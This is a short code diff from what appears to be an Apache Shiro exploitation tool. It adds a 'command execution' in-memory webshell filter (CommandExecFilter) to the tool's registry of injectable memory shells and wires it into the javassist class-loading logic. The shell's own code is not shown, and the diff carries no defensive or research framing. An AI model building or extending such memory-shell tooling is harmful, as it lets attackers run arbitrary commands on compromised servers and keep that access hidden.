@@ -1,10 +1,8 @@
 package com.sma11new.exp.shiro.attack.memShell;
 
-import com.sma11new.exp.shiro.attack.echo.ClassLoader;
 import com.sma11new.exp.shiro.attack.shell.*;
 import javassist.ClassPool;
 import javassist.CtClass;
-import org.apache.shiro.codec.Base64;
 
 import java.util.HashMap;
 import java.util.Map;
@@ -51,6 +49,8 @@ public class MemBytes {
         
         MEM_MAP.put("ChangeShiroKey[Filter]","ChangeShiroKeyFilter");
         MEM_MAP.put("ChangeShiroKey[Filter2]","ChangeShiroKeyFilter2");
+
+        MEM_MAP.put("命令执行[Filter]", "CommandExecFilter");
         
         MEM_MAP.put("BastionFilter","BastionFilter");
         MEM_MAP.put("BastionEncryptFilter","BastionEncryptFilter");
@@ -107,6 +107,8 @@ public class MemBytes {
                 clazz = pool.get(BastionEncryptFilter.class.getName());
             } else if (value.equals("AddDllFilter")) {
                 clazz = pool.get(AddDllFilter.class.getName());
+            } else if (value.equals("CommandExecFilter")) {
+                clazz = pool.get(CommandExecFilter.class.getName());
             }
 
             assert clazz != null;
